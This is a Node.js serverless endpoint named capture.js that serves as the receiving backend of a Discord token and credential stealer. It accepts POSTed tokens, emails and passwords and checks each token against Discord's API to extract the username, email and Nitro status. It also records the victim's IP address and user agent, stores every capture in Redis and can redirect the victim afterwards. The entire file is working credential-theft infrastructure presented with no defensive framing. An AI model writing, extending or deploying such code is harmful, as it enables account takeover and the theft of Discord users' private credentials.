// api/capture.js - Node.js 20+ compatible
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
  // Allow only POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

    // Get client info
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const ua = req.headers['user-agent'] || 'unknown';

    // Validate token with Discord API
    let valid = 0, username = null, discord_email = null, nitro = 0;

    if (data.token) {
      try {
        const discordRes = await fetch('https://discord.com/api/v10/users/@me', {
          headers: { Authorization: data.token }
        });
        if (discordRes.ok) {
          const user = await discordRes.json();
          valid = 1;
          username = user.username;
          discord_email = user.email;
          nitro = user.premium_type > 0 ? 1 : 0;
        }
      } catch (e) {
        console.log('Token validation error:', e.message);
      }
    }

    // Store in Redis
    const entry = {
      id,
      token: data.token || null,
      email: data.email || null,
      password: data.password || null,
      source: data.source || 'unknown',
      ip,
      ua,
      valid,
      username,
      discord_email,
      nitro,
      timestamp: new Date().toISOString()
    };

    await redis.hset(`token:${id}`, entry);
    await redis.lpush('token_ids', id);

    console.log('✅ New capture:', { id, valid, username });

    // Redirect if requested
    if (data.redirect) {
      return res.redirect(302, data.redirect);
    }

    return res.status(200).json({ status: 'logged', id, valid });

  } catch (error) {
    console.error('Capture error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
}